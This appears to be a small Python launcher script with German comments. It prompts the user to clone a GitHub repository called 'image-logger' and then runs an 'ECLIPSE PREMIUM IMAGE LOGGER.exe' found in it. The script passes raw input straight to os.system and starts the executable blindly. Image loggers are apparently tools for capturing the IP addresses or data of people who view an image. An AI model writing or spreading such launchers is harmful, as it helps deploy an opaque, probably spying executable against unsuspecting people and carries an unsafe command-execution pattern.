import os

def run_custom_command(command):
    os.system(command)

def open_folder(folder_path):
    os.startfile(folder_path)

def execute_exe(file_path):
    os.startfile(file_path)

# Benutzerdefinierter Befehl ausführen
custom_command = input("git clone https://github.com/PsxDupingg/image-logger: ")
run_custom_command(custom_command)

# Ordner öffnen
folder_path = input("image-logger: ")
open_folder(folder_path)

# .exe-Datei ausführen
exe_file_path = input("ECLIPSE PREMIUM IMAGE LOGGER.exe: ")
execute_exe(exe_file_path)
